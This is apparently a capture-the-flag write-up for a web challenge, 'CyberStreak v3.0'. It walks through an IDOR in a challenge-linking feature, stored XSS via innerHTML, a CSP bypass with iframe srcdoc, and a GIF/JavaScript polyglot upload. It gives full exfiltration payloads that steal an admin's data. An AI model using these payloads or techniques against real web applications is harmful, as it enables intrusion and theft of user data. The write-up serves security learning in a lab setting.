# CyberStreak v3.0

> Thank you for your report !
> 
> You can now share your challenges with other users and retrieve challenges proposed by other users. In addition, an interface allows you to compare your progress with other users.
> 
> xXx-michel-xXx
> 
> http://challs.dvc.tf:5003
>
> 	
> *Brute force is strictly forbidden and useless.*
>

- Create a account
- Go into the marketplace
- Link one of the challenges and check the content of the request : `{"id":"i__2Ks5-UQdIUAJ_pDnopaFLux8","username":"None"}`
- This functionnality give us the possibility to link any challenge if we know its id to another user with his username
- Username of the target is `xXx-michel-xXx`
- Create a new challenge
- See that the enable/disable/delete functionnalities in the profile panel are vulnerable to XSS with the use of `innerHTML` (`<b>test</b>`)
- CSP headers + innerHTML -> you have to execute javascript with a file with `<iframe srcdoc="<script src='/path/to/file'></script>"/>`
- To be able to create a javascript file, you need polyglot file GIF / JS : `GIF89a/*<svg/onload=alert(1)>*/=<javascript>//;`
- Because of CSP, you can't do external request -> you can exfiltrate the flag by linking the challenge with the flag to your user
- The following payload can be use to exfiltrate any data of the admin source code : 

```js
exfiltrate_data = btoa(parent.document.getElementById("currentChallenge").src);
// create a challenge to exfiltrate data
let xhr = new XMLHttpRequest();
xhr.open("POST", "/challenge", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onreadystatechange = function () {
    if (this.readyState === 4) {
        if (xhr.status === 200) {
            // get ID
            xhr.open("GET", "/", true);
            xhr.onreadystatechange = function () {
                if (this.readyState === 4) {
                    if (xhr.status === 200) {
                        text = xhr.responseText;
                        const regex = /<div id="([^"]*)/gm;
                        index = text.search(regex);
                        console.log(index);
                        id = text.substring(index + 9, index + 9 + 27);
                        console.log(id);
                        if (id && id != "") {
                            // link to another user
                            let xhr = new XMLHttpRequest();
                            xhr.open("LINK", "/marketplace", true);
                            xhr.setRequestHeader("Content-Type", "application/json");
                            xhr.onreadystatechange = function () {
                                if (this.readyState === 4) {
                                    if (xhr.status === 200) {
                                        console.log("hacked :)");
                                    }
                                }
                            };
                            xhr.send(JSON.stringify({"id": id, "username": "aa"})); // change username here
                        }
                    }
                }
            };
            xhr.send();
        }
    }
};
let data = JSON.stringify({"challenge_name": exfiltrate_data, "image_name": "aa.gif", "image": "data:image/gif;base64,R0lGODlhLyo=", "starting_number": "1", "evolution_step": "1"});
xhr.send(data);
```

- Create an image with the following : 
```js
GIF89a/*<svg/onload=alert(1)>*/=exfiltrate_data=btoa(parent.document.getElementById("currentChallenge").src);let xhr=new XMLHttpRequest;xhr.open("POST","/challenge",!0),xhr.setRequestHeader("Content-Type","application/json"),xhr.onreadystatechange=function(){4===this.readyState&&200===xhr.status&&(xhr.open("GET","/",!0),xhr.onreadystatechange=function(){if(4===this.readyState&&200===xhr.status){text=xhr.responseText;const e=/<div id="([^"]*)/gm;if(index=text.search(e),console.log(index),id=text.substring(index+9,index+9+27),console.log(id),id&&""!=id){let e=new XMLHttpRequest;e.open("LINK","/marketplace",!0),e.setRequestHeader("Content-Type","application/json"),e.onreadystatechange=function(){4===this.readyState&&200===e.status&&console.log("hacked :)")},e.send(JSON.stringify({id:id,username:"michel2"}))}}},xhr.send())};let data=JSON.stringify({challenge_name:exfiltrate_data,image_name:"aa.gif",image:"data:image/gif;base64,R0lGODlhLyo=",starting_number:"1",evolution_step:"1"});xhr.send(data);//;
```
- Look at the source code of the main page to find the URL of the image : `/uploaded_images/961b6dd3ede3cb8ecbaacbd68de040cd78eb2ed5889130cceb4c49268ea4d506/999294d3baf8bf4a5673a0624d73c98f`
- Create another challenge with the following payload as name : `<iframe srcdoc="<script src='/uploaded_images/961b6dd3ede3cb8ecbaacbd68de040cd78eb2ed5889130cceb4c49268ea4d506/999294d3baf8bf4a5673a0624d73c98f'></script>"/>`
- Link this challenge with `xXx-michel-xXx` and get the flag !
